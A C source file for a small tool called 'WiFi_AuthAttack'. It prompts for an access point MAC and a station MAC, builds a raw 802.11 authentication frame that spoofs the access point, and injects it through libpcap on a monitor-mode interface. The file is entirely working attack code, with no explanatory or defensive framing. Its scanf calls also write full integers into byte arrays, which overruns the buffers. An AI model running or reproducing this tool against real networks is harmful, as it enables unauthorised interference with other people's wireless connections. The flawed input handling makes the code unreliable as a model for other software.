#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include <stdbool.h>
#include <unistd.h>

void usage() {
	printf("syntax: WiFi_AuthAttack <interface>\n");
	printf("sample: WiFi_AuthAttack mon0\n");
}

typedef struct {
	char* dev_;
} Param;

Param param  = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;
	
	u_char AP[6];
    u_char S[6];

    u_char IN_AP[6];
    u_char IN_S[6];

	printf("AP Mac: ");
	scanf("%x:%x:%x:%x:%x:%x", &IN_AP[0], &IN_AP[1], &IN_AP[2], &IN_AP[3], &IN_AP[4], &IN_AP[5]);

    memcpy(AP, &IN_AP, sizeof(IN_AP));

    printf("Station Mac: ");
    scanf("%x:%x:%x:%x:%x:%x", &IN_S[0], &IN_S[1], &IN_S[2], &IN_S[3], &IN_S[4], &IN_S[5]);

    memcpy(S, &IN_S, sizeof(IN_S));

	unsigned char packet[1024] = {
		0x00, 0x00, 0x18, 0x00, 0x2e, 0x40, 0x00, 0xa0, 0x20, 0x08, 0x00, 0x00, 0x00, 0x02, 0xa8, 0x09,
		0xa0, 0x00, 0xd5, 0x00, 0x00, 0x00, 0xd5, 0x00, 0xb0, 0x00, 0x3a, 0x01, AP[0], AP[1], AP[2], AP[3],
        AP[4], AP[5], S[0], S[1], S[2], S[3], S[4], S[5], AP[0], AP[1], AP[2], AP[3], AP[4], AP[5], 0x10, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xdd, 0x09, 0x00, 0x10, 0x18, 0x02, 0x00, 0x00, 0x10, 0x00,
        0x00
	};

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
    printf("{ %02X:%02X:%02X:%02X:%02X:%02X } <-> { %02X:%02X:%02X:%02X:%02X:%02X }\n",AP[0], AP[1], AP[2], AP[3], AP[4], AP[5], S[0], S[1], S[2], S[3], S[4], S[5]);  
	if(pcap_sendpacket(pcap, packet, 65) != 0){
		printf("[-] Failed!\n");
        pcap_close(pcap);
        return 0;
	}
    printf("[*] Sent\n");

    pcap_close(pcap);
}